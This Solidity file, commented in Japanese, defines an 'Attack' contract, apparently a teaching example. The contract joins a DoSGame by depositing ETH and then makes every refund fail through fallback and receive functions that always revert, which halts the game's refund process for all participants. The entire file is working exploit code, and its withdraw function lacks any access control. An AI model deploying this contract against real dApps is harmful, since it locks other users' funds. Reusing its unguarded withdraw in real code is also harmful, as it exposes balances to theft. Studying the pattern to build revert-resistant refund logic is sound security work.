// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

// DoSGameをインポート（実際の使用時は同じファイルまたは別途インポート）
import "./DoSGame.sol";

// DoS攻撃を実行する悪意のあるコントラクト
// fallback関数でETHの受け取りを拒否し、返金処理を妨害する
contract Attack {

    // 返金時にDoS攻撃を実行
    // このfallback関数により、ETHの受け取りを拒否し返金処理を停止させる
    fallback() external payable{
        revert("DoS Attack!");  // 常にrevertして返金を失敗させる
    }

    // receive関数も同様にrevertして攻撃を確実にする
    receive() external payable {
        revert("DoS Attack!");
    }

    // DoSゲームに参加して預金する
    // この関数を呼び出すことで、攻撃者もゲームの参加者となる
    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }

    // 攻撃者がコントラクトから資金を引き出すための関数
    // （攻撃後に自分の資金を回収したい場合に使用）
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}